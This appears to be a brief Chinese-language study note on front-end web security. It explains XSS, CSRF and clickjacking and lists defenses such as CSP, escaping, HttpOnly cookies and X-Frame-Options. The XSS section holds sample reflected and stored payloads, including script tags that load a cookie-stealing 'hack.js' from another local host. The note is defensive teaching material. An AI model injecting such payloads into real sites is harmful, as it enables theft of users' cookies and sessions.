# XSS

cross site scripting 与 css 重叠所以只能叫 xss
跨站脚本攻击

存在安全漏洞的 web 网站注册用户的浏览器内运行非法的非本站点 HTML 标签或者 Javascript 进行的一种攻击

影响：

- 利用虚假输入表单骗取用户个人信息
- 利用脚本窃取用户 Cookie 的值
- 显示伪造的文章或图片

XSS 攻击分类
反射型 - url 参数直接注入

> // 普通 http://localhost:3000/?from=china
> // alert 尝试 http://localhost:3000/?from=<script>alert(3)</script>
> // 获取 Cookie http://localhost:3000/?from=<script src="http://localhost:4000/hack.js"> </script>
> // 短域名伪造 https://dwz.cn/

存储型 - 存储到 DB 后读取时注入

```
// 评论 <script>alert(1)</script>
// 跨站脚本注入 我来了<script src="http://localhost:4000/hack.js"></script>
```

XSS 攻击的危害 - Scripting 能干啥就能干啥
获取页面数据
获取 Cookies
劫持前端逻辑
发送请求
偷取网站的任意数据
偷取用户的资料
偷取用户的秘密和登录态
欺骗用户

防范手段

- HEAD
  ctx.set('X-XSS-Protection', 0) // 禁止 XSS 过滤 // http://localhost:3000/?from=<script>alert(3)</script> 可以拦截 但伪装一下就不行了
- CSP 白名单
- 转义字符
- 黑名单
- HttpOnly Cookie
  保护 cookie

# CSRF

跨站请求伪造，常见的 web 攻击，利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作

CSRF 攻击危害
利用用户登录态
用户不知情
完成业务请求
盗取用户资金（转账，消费）
冒充用户发帖背锅
损害网站声誉

防御
禁止第三方网站带 Cookie - 有兼容性问题
Referer Check - Https 不发送 referer
验证码

# 点击劫持 - clickjacking

点击劫持是一种视觉欺骗的攻击手段。攻击者将需要攻击的网站通过 iframe 嵌套的方式嵌入自己
的网页中，并将 iframe 设置为透明，在页面中透出一个按钮诱导用户点击。

防御
X-FRAME-OPTIONS
js 方式

SQL 注入

OS 命令注入

http 劫持

dns 劫持

# HTTPS

# 风控策略

# 可信前端

# 前端-服务端安全策略
